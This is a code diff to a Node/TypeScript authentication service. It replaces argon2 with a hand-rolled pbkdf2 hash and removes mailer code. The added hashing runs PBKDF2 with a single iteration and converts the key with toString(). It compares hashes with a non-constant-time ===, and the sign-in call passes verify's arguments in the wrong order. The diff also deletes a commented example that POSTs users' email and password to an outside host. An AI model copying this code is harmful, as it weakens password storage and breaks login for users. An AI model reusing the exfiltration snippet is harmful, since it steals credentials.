@@ -1,45 +1,42 @@
 import { Service, Inject } from 'typedi';
-import jwt from 'jsonwebtoken';
-import MailerService from './mailer';
 import config from '@/config';
-import argon2 from 'argon2';
-import { randomBytes } from 'crypto';
+import { pbkdf2, randomBytes } from 'crypto';
 import { IUser, IUserInputDTO } from '@/interfaces/IUser';
 import { EventDispatcher, EventDispatcherInterface } from '@/decorators/eventDispatcher';
 import events from '@/subscribers/events';
+import jwt from 'jsonwebtoken';
 
 @Service()
 export default class AuthService {
   constructor(
     @Inject('userModel') private userModel: Models.UserModel,
-    private mailer: MailerService,
     @Inject('logger') private logger,
     @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
-  ) {
+  ) {}
+
+  private async hash(inputPw: string, { salt }: { salt: string | Buffer }): Promise<string> {
+    const iterations = 1;
+    const keylen = 64;
+    const digest = 'sha256';
+    return new Promise((res, rej) =>
+      pbkdf2(inputPw, salt, iterations, keylen, digest, (err, key) => {
+        if (err) rej(err);
+        res(key.toString());
+      }),
+    );
+  }
+
+  private async verify(inputPw, salt: string, storedPw) {
+    const hashedPw = await this.hash(inputPw, { salt });
+    return hashedPw === storedPw;
   }
 
   public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
     try {
       const salt = randomBytes(32);
 
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
       this.logger.silly('Hashing password');
-      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
+      const hashedPassword = await this.hash(userInputDTO.password, { salt });
       this.logger.silly('Creating user db record');
       const userRecord = await this.userModel.create({
         ...userInputDTO,
@@ -52,8 +49,6 @@ export default class AuthService {
       if (!userRecord) {
         throw new Error('User cannot be created');
       }
-      this.logger.silly('Sending welcome email');
-      await this.mailer.SendWelcomeEmail(userRecord);
 
       this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
 
@@ -78,12 +73,10 @@ export default class AuthService {
     if (!userRecord) {
       throw new Error('User not registered');
     }
-    /**
-     * We use verify from argon2 to prevent 'timing based' attacks
-     */
+
     this.logger.silly('Checking password');
-    const validPassword = await argon2.verify(userRecord.password, password);
-    if (validPassword) {
+    const isValid = await this.verify(userRecord.password, userRecord.salt, password);
+    if (isValid) {
       this.logger.silly('Password is valid!');
       this.logger.silly('Generating JWT');
       const token = this.generateToken(userRecord);
@@ -91,9 +84,7 @@ export default class AuthService {
       const user = userRecord.toObject();
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
-      /**
-       * Easy as pie, you don't need passport.js anymore :)
-       */
+
       return { user, token };
     } else {
       throw new Error('Invalid Password');
@@ -122,7 +113,7 @@ export default class AuthService {
         name: user.name,
         exp: exp.getTime() / 1000,
       },
-      config.jwtSecret
+      config.jwtSecret,
     );
   }
 }
